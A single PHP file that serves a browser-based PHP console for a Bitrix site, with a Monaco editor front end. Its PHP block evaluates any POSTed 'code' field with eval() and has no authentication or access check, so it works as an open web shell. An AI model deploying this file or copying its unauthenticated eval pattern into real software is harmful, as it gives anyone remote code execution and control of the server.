<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  if (isset($_POST['code'])) {
    @include_once $_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/include/prolog_before.php';

    header('Content-type: text/plain');
    echo eval(preg_replace('/^<\?(php)?/i', '', $_POST['code']));
  }

  exit();
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Console</title>

  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/monaco-editor/min/vs/loader.js"></script>
  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      background: #1e1e1e;
      width: 100vw;
      height: 100vh;
    }

    form {
      display: grid;
      height: 100%;
      grid-template-columns: repeat(2, 1fr);
      grid-template-rows: auto 1fr;
    }

    .run-area {
      padding: 1rem 0;
      display: flex;
      justify-content: center;
      grid-column: 1 / span 2;
    }

    .run-area button {
      font-size: 16px;
      font-weight: 700;
    }

    .btn--wrap {
      width: 180px;
      height: 60px;
      position: relative;
    }

    .btn {
      width: inherit;
      height: inherit;
      cursor: pointer;
      background: transparent;
      border: 1px solid #91C9FF;
      outline: none;
      transition: 1s ease-in-out;
    }

    svg {
      position: absolute;
      left: 0;
      top: 0;
      fill: none;
      stroke: #fff;
      stroke-dasharray: 150 480;
      stroke-dashoffset: 150;
      transition: 1s ease-in-out;
    }

    .btn:hover {
      transition: 1s ease-in-out;
      background: #4F95DA;
    }

    .btn:hover svg {
      stroke-dashoffset: -480;
    }

    .btn span {
      color: white;
      font-size: 18px;
      font-weight: 100;
    }
  </style>
</head>

<body>
  <form action="" method="post" target="run" id="run">
    <div class="run-area">
      <div class="btn--wrap">
        <button class="btn" type="submit" name="send" value="1"><svg width="180px" height="60px" viewBox="0 0 180 60" class="border">
            <polyline points="179,1 179,59 1,59 1,1 179,1" class="bg-line" />
            <polyline points="179,1 179,59 1,59 1,1 179,1" class="hl-line" />
          </svg>
          <span>|></span>
        </button>
      </div>
    </div>
    <div id="editorCode"></div>
    <div id="editorCodeResult"></div>
    <input type="hidden" name="code" id="code">
  </form>
  <iframe frameborder="0" name="run" id="frame" style="display: none;" src="javascript:void(0)"></iframe>
  <script>
    const HTML_CODE = (``);
    const CSS_LINKS = [`https://cdn.jsdelivr.net/npm/bootstrap/dist/css/bootstrap.min.css`];
    const editorCode = document.getElementById("editorCode");
    const editorCodeResult = document.getElementById("editorCodeResult");
    const form = document.getElementById("run");
    const code = document.getElementById("code");
    const frame = document.getElementById("frame");

    require.config({
      paths: {
        vs: "https://cdn.jsdelivr.net/npm/monaco-editor/min/vs"
      }
    });

    window.MonacoEnvironment = {
      getWorkerUrl: function(workerId, label) {
        return `data:text/javascript;charset=utf-8,${encodeURIComponent(`
        self.MonacoEnvironment = {
          baseUrl: 'https://cdn.jsdelivr.net/npm/monaco-editor/min/'
        };
        importScripts('https://cdn.jsdelivr.net/npm/monaco-editor/min/vs/base/worker/workerMain.js');`)}`;
      }
    };

    require(["vs/editor/editor.main"], function() {
      let editor = createEditor(editorCode, 'php', "\<\?php\r\n\r\n");
      let result = createEditor(editorCodeResult, 'text/plain', '');

      form.onsubmit = (e) => {
        if (e.submitter.name != 'send')
          e.preventDefault();
      }
      frame.onload = (e) => {
        result.setValue(frame.contentDocument.body.innerText);
      }

    });

    function createEditor(editorContainer, lang, val) {
      return monaco.editor.create(editorContainer, {
        value: val,
        language: lang,
        minimap: {
          enabled: false
        },
        theme: "vs-dark",
        automaticLayout: true,
        contextmenu: false,
        fontSize: 14,
        scrollbar: {
          useShadows: false,
          vertical: "visible",
          horizontal: "visible",
          horizontalScrollbarSize: 12,
          verticalScrollbarSize: 12
        }
      });
    }
  </script>
</body>

</html>